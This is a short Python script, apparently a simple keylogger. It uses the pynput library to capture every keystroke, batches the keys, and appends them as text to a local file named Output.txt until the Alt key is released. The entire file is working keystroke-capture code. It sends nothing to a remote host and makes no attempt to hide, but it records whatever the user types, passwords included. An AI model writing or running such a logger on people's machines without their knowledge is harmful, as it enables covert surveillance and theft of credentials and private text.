from pynput.keyboard import Key,Listener

keys = []
count = 0
def on_press(key):
    global keys,count
    print("{0} pressed".format(key))
    keys.append(key)
    count = count + 1
    if count > 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    #This is just to write the pressed key onto a txt file with some sanity checks
    with open("Output.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
              f.write(" ")
            elif k.find("Key") == -1:
              f.write(k)

def on_release(key):
    if key == Key.alt:
        return False
#This lib listens to the keyboard and call the write_file
with Listener(on_press = on_press , on_release=on_release) as listener:
    listener.join()



